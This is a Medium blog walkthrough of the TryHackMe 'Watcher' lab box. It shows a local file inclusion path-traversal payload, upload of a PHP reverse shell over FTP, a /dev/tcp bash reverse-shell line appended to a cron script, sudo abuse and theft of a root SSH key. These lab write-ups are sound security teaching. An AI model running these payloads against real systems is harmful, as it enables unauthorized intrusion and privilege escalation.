---
title: "Watcher Tryhackme Writeup 136579abd428"
platform: Medium
original_file: 2024-08-25_Watcher-Tryhackme-Writeup-136579abd428.md
---

# Watcher Tryhackme Writeup 136579abd428

::: {}
# Watcher Tryhackme Writeup {#watcher-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "Watcher"
:::

::::::: {.section .e-content field="body"}
:::::: {#51ab .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Watcher Tryhackme Writeup {#ddc6 .graf .graf--h3 .graf--leading .graf--title name="ddc6"}

**This is a Writeup of Tryhackme room "Watcher"**

<figure id="1b22" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*oqXPbifrxt_3Zrl-.png"
class="graf-image" data-image-id="0*oqXPbifrxt_3Zrl-.png"
data-width="451" data-height="250" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/watcher](https://tryhackme.com/room/watcher){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/watcher"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is free**

### Introduction {#8edc .graf .graf--h3 .graf-after--p name="8edc"}

Watcher was an eloquently constructed beginner level box designed to
help introduce some key concepts and methods that are often seen across
various penetration testing platforms. Despite not having any
particularly difficult parts, it required some out of the box thinking
as well as the ability to effectively analyse and chain together
exploitation techniques. It's a relatively long box, but provides a
thoroughly enjoyable learning experience.

### Initial Enumeration {#45ea .graf .graf--h3 .graf-after--p name="45ea"}

<figure id="b0a6" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*3TPXbs05Y13c50Uv.png"
class="graf-image" data-image-id="0*3TPXbs05Y13c50Uv.png"
data-width="442" data-height="261" />
</figure>

Initial nmap scan shows the following ports:\
21 vsftpd (up to date)\
22 SSH 7.6p1 (up to date)\
80 HTTP with Jekyll 4.1.1

### Web Server {#0619 .graf .graf--h3 .graf-after--p name="0619"}

Running a gobuster on the web server:

``` {#ca6e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u 10.10.211.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
```

<figure id="9ab0" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*5wwy8BAtTCuqZ-1i.png"
class="graf-image" data-image-id="0*5wwy8BAtTCuqZ-1i.png"
data-width="344" data-height="182" />
</figure>

Traversing to the website and checking the `/robots.txt`{.markup--code
.markup--p-code} page shows some interesting pages.

<figure id="85f9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*bL0Tj3SCNqXq6QvS.png"
class="graf-image" data-image-id="0*bL0Tj3SCNqXq6QvS.png"
data-width="449" data-height="165" />
</figure>

<figure id="19df" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Nw8mDyvdlYJwlWzV.png"
class="graf-image" data-image-id="0*Nw8mDyvdlYJwlWzV.png"
data-width="458" data-height="129" />
</figure>

**/flag_1.txt** contains the first flag. The second directory at
**/secret_file_do_not_read.txt** can't be accessed. Something to
remember for later perhaps.

<figure id="2dfc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*slxD_FqcXfWoUBoT.png"
class="graf-image" data-image-id="0*slxD_FqcXfWoUBoT.png"
data-width="577" data-height="233" />
</figure>

Going back to the initial webpage, there is little functionality aside
from links from clicking the photo of each placemat.

<figure id="b624" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*1IZ4HNSwXTicimPQ.png"
class="graf-image" data-image-id="0*1IZ4HNSwXTicimPQ.png"
data-width="790" data-height="675" />
</figure>

The description page for each placemat has a GET parameter in the URL
which displays the post that you're looking at:

[http://10.10.211.47/post.php?post=striped.php](http://10.10.211.47/post.php?post=striped.php){.markup--anchor
.markup--p-anchor
data-href="http://10.10.211.47/post.php?post=striped.php"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="24df" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*AmOe5WG0syDuz1lw.png"
class="graf-image" data-image-id="0*AmOe5WG0syDuz1lw.png"
data-width="709" data-height="580" />
</figure>

The input for the GET parameter isn't sanitized, so we can perform a
local file inclusion attack. Going to
[http://10.10.211.47/post.php](http://10.10.211.47/post.php?post=striped.php){.markup--anchor
.markup--p-anchor
data-href="http://10.10.211.47/post.php?post=striped.php"
rel="noopener ugc nofollow noopener"
target="_blank"}[?post=../../../etc/passwd](http://10.10.202.136/post.php?post=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd){.markup--anchor
.markup--p-anchor
data-href="http://10.10.202.136/post.php?post=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
rel="noopener ugc nofollow noopener" target="_blank"} shows the users on
the box.

<figure id="3289" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*cat2fv0K3Q-2VO5g.png"
class="graf-image" data-image-id="0*cat2fv0K3Q-2VO5g.png"
data-width="875" data-height="479" />
</figure>

Now we have a way to read files from the server. Thinking back to our
initial exploration of the **robots.txt** file, there was a file we
didn't have access to, maybe we can get to it via the file inclusion
vulnerability? We can assume the web "root" is **/var/www/html** as
that's the default location.

``` {#57ad .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
http://10.10.211.47/post.php?post=../../../var/www/html/secret_file_do_not_read.txt
```

<figure id="ceb7" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*nLl6crCpmWemgvJx.png"
class="graf-image" data-image-id="0*nLl6crCpmWemgvJx.png"
data-width="875" data-height="195" />
</figure>

We get credentials.

### FTP {#bd95 .graf .graf--h3 .graf-after--p name="bd95"}

Now we have credentials, it is time to explore FTP! Connect and
authenticate by using **ftp 10.10.211.47**. When logged in, running a
dir command to list the contents of the directory shows the second flag
is there, and a folder called files

<figure id="2b9f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*X9KmlKKIlRqYtM9o.png"
class="graf-image" data-image-id="0*X9KmlKKIlRqYtM9o.png"
data-width="687" data-height="369" />
</figure>

<figure id="786f" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Tc6_ILcLUXLFdxfh.png"
class="graf-image" data-image-id="0*Tc6_ILcLUXLFdxfh.png"
data-width="566" data-height="280" />
</figure>

The **`files`{.markup--code .markup--p-code}** directory is empty, but
we can see from the permissions that it is writeable. In the original
message that we got the credentials from, it says I've set the files to
be saved to /home/ftpuser/ftp/files . Since we can write to this
directory, we can upload things to the server.

Grab a php shell from pentest monkey's
[**github**](https://github.com/pentestmonkey/php-reverse-shell){.markup--anchor
.markup--p-anchor
data-href="https://github.com/pentestmonkey/php-reverse-shell"
rel="noopener ugc nofollow noopener" target="_blank"} and edit it to
contain your IP and the port you plan to host a netcat listener on.

**Shell.php**

<figure id="f678" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*WsaxkiK2bJ9soQAF.png"
class="graf-image" data-image-id="0*WsaxkiK2bJ9soQAF.png"
data-width="559" data-height="367" />
</figure>

Then go back into the ftp server and into the `files`{.markup--code
.markup--p-code} folder and use the `put`{.markup--code .markup--p-code}
command to upload the shell.

<figure id="aabb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*1OS-Mhd8z4_dKGQN.png"
class="graf-image" data-image-id="0*1OS-Mhd8z4_dKGQN.png"
data-width="691" data-height="632" />
</figure>

Since we know the path of the uploads, it is now possible to traverse to
the php file and it will execute the code inside. However, we need a
netcat listener sat waiting to catch the connection.

<figure id="135a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*y3AGVNdKHenlj9m3.png"
class="graf-image" data-image-id="0*y3AGVNdKHenlj9m3.png"
data-width="374" data-height="109" />
</figure>

Then traverse to
**10.10.211.47/post.php?post=../../../home/ftpuser/ftp/files/shell.php**
(Changing the name of the file to whatever you uploaded it as) and the
listener should catch a reverse shell.

<figure id="3240" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*MzfPBXZGWFeHQKIy.png"
class="graf-image" data-image-id="0*MzfPBXZGWFeHQKIy.png"
data-width="576" data-height="114" />
</figure>

<figure id="383b" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Fr28wVpVLtjonYBo.png"
class="graf-image" data-image-id="0*Fr28wVpVLtjonYBo.png"
data-width="614" data-height="270" />
</figure>

Here we got reverse shell

Get TTy shell

``` {#ddb5 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
script -qc /bin/bash /dev/null
```

Personally, I always like to check out the web folder when I get into a
box to see if there was any files or database credentials lying about.
Going to **/var/www/html** and typing ls shows the contents of the
directory. All files and directories there are the ones we saw before,
aside from **more_secrets_a9f10a**

<figure id="37d8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*6BJBa4IuVgf0J8tS.png"
class="graf-image" data-image-id="0*6BJBa4IuVgf0J8tS.png"
data-width="731" data-height="406" />
</figure>

In here there is the third flag!

### Lateral Movement {#98f6 .graf .graf--h3 .graf-after--p name="98f6"}

The next thing I do is check the less-used directories, such as **/opt**
and **/media,** incase there's anything lying about. In **/opt/** there
is a backups directory that is owned by root and accessible by the adm
group, so there is a potential avenue if we get a user that is part of
that group.

<figure id="d751" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*z-e0IqEh_khSdT90.png"
class="graf-image" data-image-id="0*z-e0IqEh_khSdT90.png"
data-width="486" data-height="298" />
</figure>

Going to the **/home/** directories next, both **toby** and **mat** have
**note.txt** that are readable

<figure id="303f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*JhxlAL1t_V5OxUkK.png"
class="graf-image" data-image-id="0*JhxlAL1t_V5OxUkK.png"
data-width="528" data-height="406" />
</figure>

Since `toby`{.markup--code .markup--p-code} has flag 4, I\'ll assume
that\'s the first user to get. The note talks about `mat`{.markup--code
.markup--p-code} setting up cron jobs.

<figure id="03e1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZvyzVQc-ZLdAj3QM.png"
class="graf-image" data-image-id="0*ZvyzVQc-ZLdAj3QM.png"
data-width="745" data-height="234" />
</figure>

If we run **sudo -l** to check our sudo permissions, we can see that we
can run ALL commands without a password as the user toby.

<figure id="ddc0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*kB4SpNXcOiwavAbE.png"
class="graf-image" data-image-id="0*kB4SpNXcOiwavAbE.png"
data-width="608" data-height="236" />
</figure>

<figure id="87ac" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*BpgjSEVkYULzU6Fn.png"
class="graf-image" data-image-id="0*BpgjSEVkYULzU6Fn.png"
data-width="497" data-height="339" />
</figure>

Going back to the information we found earlier about the cron jobs, I'm
thinking we need to edit a running cronjob that executes as
`mat`{.markup--code .markup--p-code} to get user as him instead.
Checking the `jobs`{.markup--code .markup--p-code} folder, there is a
`cow.sh`{.markup--code .markup--p-code} file that we own that constantly
copies BEEFY pictures to the `/tmp`{.markup--code .markup--p-code}
directory. It is owned by our current user, and so we can edit it.
Examining the `/etc/crontab`{.markup--code .markup--p-code} shows that
the script runs every minute as the user **`mat`{.markup--code
.markup--p-code}**, so even though `toby`{.markup--code .markup--p-code}
owns it, it executes in the context of the user running the cron.

<figure id="0709" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*iNehHpQtBnQx4X6Z.png"
class="graf-image" data-image-id="0*iNehHpQtBnQx4X6Z.png"
data-width="875" data-height="464" />
</figure>

Add a reverse shell into the file the cronjob executes, obviously
changing the IP and port

But before start netcat reverse shell

``` {#fb30 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lvp 4444
```

`echo 'bash -c "bash -i >& /dev/tcp/10.2.12.26/4444 0>&1"' >> cow.sh`{.markup--code
.markup--p-code}

<figure id="bf90" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*I_3_eRbriZL2DZMO.png"
class="graf-image" data-image-id="0*I_3_eRbriZL2DZMO.png"
data-width="875" data-height="158" />
</figure>

Then after a minute or so, `mat`{.markup--code .markup--p-code} will
execute the now malicious bash script and send us a reverse shell as his
user.

<figure id="dac9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*AOMsUTc47hSUB5aw.png"
class="graf-image" data-image-id="0*AOMsUTc47hSUB5aw.png"
data-width="630" data-height="229" />
</figure>

<figure id="8df6" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*j5DgHQKxmGLSxcCT.png"
class="graf-image" data-image-id="0*j5DgHQKxmGLSxcCT.png"
data-width="396" data-height="219" />
</figure>

We can now get flag 5.

In the note on mats home directory, we can see that will is explaining
how he can run python3 scripts as his user using sudo. Running
**`sudo -l`{.markup--code .markup--p-code}** confirms this

<figure id="42c1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*_bxjrdEdMH4VmA2s.png"
class="graf-image" data-image-id="0*_bxjrdEdMH4VmA2s.png"
data-width="875" data-height="213" />
</figure>

In the **scripts** directory, there is two files. **cmd.py** and
**will_script.py**

<figure id="eff8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*v2V1J1627gdL-gfS.png"
class="graf-image" data-image-id="0*v2V1J1627gdL-gfS.png"
data-width="521" data-height="643" />
</figure>

At the end of `will_script`{.markup--code .markup--p-code} we can see it
runs a system command that takes the parameter of `cmd`{.markup--code
.markup--p-code}, which is set to whatever is the first argument after
we run the script. The cmd script is owned by mat, and shows that if we
put in a `1`{.markup--code .markup--p-code}, it will perform
`ls -lah`{.markup--code .markup--p-code}. If we put in a
`2`{.markup--code .markup--p-code} it will perform `id`{.markup--code
.markup--p-code} and a `3`{.markup--code .markup--p-code} it will
`cat /etc/passwd`{.markup--code .markup--p-code}.
`will_script`{.markup--code .markup--p-code} only allows those three
commands it seems.

<figure id="14a6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*DvgZatjoKYa2nOgn.png"
class="graf-image" data-image-id="0*DvgZatjoKYa2nOgn.png"
data-width="599" data-height="339" />
</figure>

Since it's hard to use text editors in a netcat shell due to env
variables being off (I believe),

Since the files are in mats home directory, we add our revershell in
**cmd.py** because can't edit **will_script.py** but we can edit cmd.py

<figure id="f80b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*oL072KYPSl2O_jYD.png"
class="graf-image" data-image-id="0*oL072KYPSl2O_jYD.png"
data-width="875" data-height="179" />
</figure>

now start netcat listener

``` {#38d5 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lvp 3333
```

<figure id="fbe9" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*QPnHwu6M9Mz3SnnT.png"
class="graf-image" data-image-id="0*QPnHwu6M9Mz3SnnT.png"
data-width="875" data-height="80" />
</figure>

we can run **will_script.py** with the privileged of will user. but we
can't edit **will_script.py** so that's why i can edit **cmd.py** and
use **AND operator** to excute **cmd.py** with privileged of will user

<figure id="3fc0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*H6bTb9tkkdx1X1Po.png"
class="graf-image" data-image-id="0*H6bTb9tkkdx1X1Po.png"
data-width="608" data-height="195" />
</figure>

and here we got shell

<figure id="a902" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Bwjo78Ub8g7F2e3E.png"
class="graf-image" data-image-id="0*Bwjo78Ub8g7F2e3E.png"
data-width="438" data-height="160" />
</figure>

We got flag 6

Using `id`{.markup--code .markup--p-code} we can see that we are part of
the `adm`{.markup--code .markup--p-code} group.. Remember that backups
folder we found earlier that was owned by the `adm`{.markup--code
.markup--p-code} group? Let\'s go check it out.

<figure id="2f16" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*pGhJFplATUd5RnVG.png"
class="graf-image" data-image-id="0*pGhJFplATUd5RnVG.png"
data-width="779" data-height="291" />
</figure>

Echoing the key and piping to a `base64 -d`{.markup--code
.markup--p-code} reveals a private key.

<figure id="0be3" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*19geXSeXtYo6LiSS.png"
class="graf-image" data-image-id="0*19geXSeXtYo6LiSS.png"
data-width="667" data-height="242" />
</figure>

Save this to a file and remember to `chmod 600`{.markup--code
.markup--p-code} it.

Could it be that this is the root SSH key?!

<figure id="37b9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*H3j5QDrl14AsKQK1.png"
class="graf-image" data-image-id="0*H3j5QDrl14AsKQK1.png"
data-width="728" data-height="340" />
</figure>

<figure id="b872" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*mTm2Pa66DKVEtKz9.png"
class="graf-image" data-image-id="0*mTm2Pa66DKVEtKz9.png"
data-width="357" data-height="156" />
</figure>

And finally we got root flag

### Promote and Collaborate on Cybersecurity Insights {#c474 .graf .graf--h3 .graf-after--p name="c474"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#fc31 .graf .graf--h3 .graf-after--p name="fc31"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 25, 2024](https://medium.com/p/136579abd428).

[Canonical
link](https://medium.com/@bevijaygupta/watcher-tryhackme-writeup-136579abd428){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
